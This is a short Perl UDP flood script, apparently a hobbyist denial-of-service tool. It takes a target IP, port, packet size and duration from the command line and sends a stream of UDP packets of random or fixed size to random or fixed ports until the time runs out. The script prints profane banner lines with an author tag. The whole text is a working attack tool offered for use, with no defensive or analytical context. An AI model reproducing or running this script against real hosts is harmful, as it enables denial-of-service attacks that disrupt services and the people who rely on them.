#!/usr/bin/perl
use Socket;

my ($ip,$port,$size,$time) = @ARGV;
my ($iaddr,$endtime,$psize,$pport);
$iaddr = inet_aton("$ip") or die "Usage: perl $0 <ip> <port> <packet size> <time>\n";
$endtime = time() + ($time ? $time : 1000000);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print "FUCKING WEE POOF UP. FUCKING $ip on port $port with $size byte packets for $time seconds\n";
print "MADE BY K1LLZz. < HIYA POOF ITS NO THAT STRONG CAUSE ITS PERL\n";

for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;

  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}
